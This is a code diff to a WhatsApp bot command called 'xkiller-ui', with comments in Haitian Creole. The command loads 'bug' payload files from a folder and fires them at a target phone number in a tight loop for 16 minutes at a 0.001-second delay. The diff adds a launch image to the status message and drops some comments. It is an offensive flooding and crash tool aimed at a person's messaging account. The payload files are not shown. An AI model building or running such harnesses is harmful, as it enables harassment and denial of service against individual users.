@@ -43,11 +43,15 @@ cmd({
       return await bot.sendMessage(from, { text: '📁 No payloads found in /bugs folder.' }, { quoted: mek });
     }
 
+    // ✅ VOYE IMG 5.png AVAN ATAK
+    const imagePath = path.join(__dirname, '../media/5.png');
+    const imageBuffer = fs.readFileSync(imagePath);
     await bot.sendMessage(from, {
-      text: `🚨 xkiller-ui launched on wa.me/${targetNumber}\n🕒 Duration: 16min\n⚡ Delay: 0.001s\n📦 Payloads: ${bugFiles.length}`,
+      image: imageBuffer,
+      caption: `🚨 xkiller-ui launched on wa.me/${targetNumber}\n🕒 Duration: 16min\n⚡ Delay: 0.001s\n📦 Payloads: ${bugFiles.length}`,
     }, { quoted: mek });
 
-    const endTime = Date.now() + (16 * 60 * 1000);
+    const endTime = Date.now() + (16 * 60 * 1000); // 16 minit
 
     while (Date.now() < endTime) {
       for (const file of bugFiles) {
@@ -55,7 +59,6 @@ cmd({
           const payloadPath = path.join(bugsDir, file);
           let bugPayload = require(payloadPath);
 
-          // 👇 Si se { default: 'string' }, mete l andedan fonksyon
           if (typeof bugPayload === 'object' && typeof bugPayload.default === 'string') {
             const msg = bugPayload.default;
             bugPayload = async (bot, number) => {
@@ -63,7 +66,6 @@ cmd({
             };
           }
 
-          // 👇 Si se string senp (ex: export default 'text')
           if (typeof bugPayload === 'string') {
             const msg = bugPayload;
             bugPayload = async (bot, number) => {
